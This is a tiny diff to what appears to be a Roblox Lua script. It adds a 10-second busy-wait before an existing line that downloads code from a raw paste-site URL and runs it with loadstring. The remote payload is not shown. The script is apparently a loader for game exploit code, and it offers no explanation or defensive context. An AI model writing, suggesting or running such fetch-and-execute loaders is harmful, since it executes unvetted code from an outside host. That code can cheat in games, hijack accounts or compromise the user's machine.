@@ -1,1 +1,6 @@
+local t = tick() + 10
+while tick() < t do end
+
 loadstring(game:HttpGet("https://pastefy.app/FQkayKdi/raw"))()
+
+
